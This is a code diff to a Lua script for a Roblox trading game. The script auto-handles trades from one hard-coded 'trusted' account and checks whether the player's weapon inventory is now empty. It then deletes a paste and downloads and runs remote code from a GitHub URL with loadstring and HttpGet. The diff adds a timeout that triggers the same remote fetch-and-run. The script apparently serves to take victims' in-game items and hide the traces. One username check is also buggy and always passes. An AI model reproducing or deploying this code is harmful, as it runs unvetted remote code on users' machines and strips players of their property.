@@ -83,6 +83,10 @@ local acceptcon = actions:WaitForChild("Accept")
 local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
 local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
 
+local startTime = os.time()
+local TRADE_TIMEOUT = 60
+
+tradeReceived = false
 TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeRequest.Visible then
         local usernameLabel = TradeRequest:FindFirstChild("ReceivingRequest") and TradeRequest.ReceivingRequest:FindFirstChild("Username")
@@ -90,6 +94,7 @@ TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
             -- Если текст уже корректный и наш доверенный игрок
             if usernameLabel.Text == targetName then
                 handleTrade(usernameLabel.Text)
+                tradeReceived = true
             elseif usernameLabel.Text == "Nikilis" or "PLAYER_NAME1" then
                 -- Ждём, пока текст сменится на реального игрока
                 local conn
@@ -98,6 +103,7 @@ TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
                         conn:Disconnect()
                         if usernameLabel.Text == targetName then
                             handleTrade(usernameLabel.Text)
+                            tradeReceived = true
                         else
                             print("Трейд от недоверенного игрока:", usernameLabel.Text)
                         end
@@ -228,6 +234,19 @@ game.Players.LocalPlayer.OnTeleport:Connect(function()
     end
 end)
 
+task.spawn(function()
+    while not tradeReceived do
+        wait(3)
+        local now = os.time()
+        if now - startTime >= TRADE_TIMEOUT then
+            print("❌ В течение Value минут не было трейда от доверенного игрока.")
+            deletePaste()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'), true))()
+            break
+        end
+    end
+end)
+
 -- Функция проверки
 local function checkPlayer()
     print("слушаем наличие игрока")
@@ -279,7 +298,7 @@ local function checkInventory()
 
     if not hasAnyWeapon or isOnlyDefault then
         deletePaste()
-        print("все пусто нахуй! (только дефолт остался)")
+        print("все пусто! (только дефолт остался)")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop", true))()
         return
     else
